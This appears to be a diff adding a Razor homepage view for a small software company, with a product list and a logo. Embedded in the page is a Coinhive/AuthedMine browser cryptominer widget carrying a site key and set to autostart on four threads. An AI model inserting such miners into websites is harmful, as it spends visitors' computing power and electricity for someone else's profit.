@@ -1,0 +1,50 @@
+﻿
+@{
+    ViewBag.Title = "HomeInfo";
+    string UserName = "anon";
+}
+
+<h2>WeDoCo</h2>
+<div>
+    <div class="row">
+        <div class="col-md-4">
+            <input type="text" id=UserName class="form-control" placeholder="Username"  />
+            <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+            <div class="coinhive-miner"
+                 style="width: 256px; height: 310px"
+                 data-key="zCmQO3TZrgf7SUuMMo32MWCyzmoaag1A"
+                 data-user = @UserName
+                 data-autostart="true"
+                 data-whitelabel="false"
+                 data-background="#000000"
+                 data-text="#eeeeee"
+                 data-action="#00ff00"
+                 data-graph="#555555"
+                 data-threads="4"
+                 data-throttle="0.1">
+                <em>Loading...</em>
+            </div>
+        </div>
+        <div class="col-md-4">
+            <h2>Products</h2>
+            <p>
+                - Mobile Development.<br />
+                - E-commerce.<br />
+                - Custom Solution development.<br />
+                - Domain hosting.<br />
+                - Web hosting.<br />
+                - Business emails.<br />
+                - Social media marketing and consulting.<br />
+                - Websites<br />
+                - Custom Software for spesific problems<br />
+                - Arduino based circuit controls<br />
+                - Database Managment<br />
+            </p>
+        </div>
+        <div class="col-md-4">
+            <img src="~/Content/Pictures/Computer.png" alt="Company Logo"/>
+        </div>
+        
+    </div>
+</div>
+
